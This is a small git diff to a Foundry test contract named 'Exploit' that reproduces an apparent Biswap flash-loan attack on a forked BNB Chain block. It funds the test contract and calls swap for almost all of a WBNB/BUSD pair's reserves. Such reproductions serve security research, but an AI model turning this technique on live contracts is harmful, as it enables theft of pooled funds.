@@ -14,11 +14,13 @@ contract Exploit is Test {
 
   function setUp() public {
     vm.createSelectFork("bsc", 18671800);
+    deal(address(wbnb), address(this), 0.2 ether);
+    deal(address(busd), address(this), 0.2 ether);
   }
 
   function testBiswap_flashloan() public {
     (uint112 _reserve0, uint112 _reserve1, ) = wbnbBusdPair.getReserves();
-    wbnbBusdPair.swap(
+      wbnbBusdPair.swap(
       _reserve0 - 1,
       _reserve1 - 1,
       address(this),
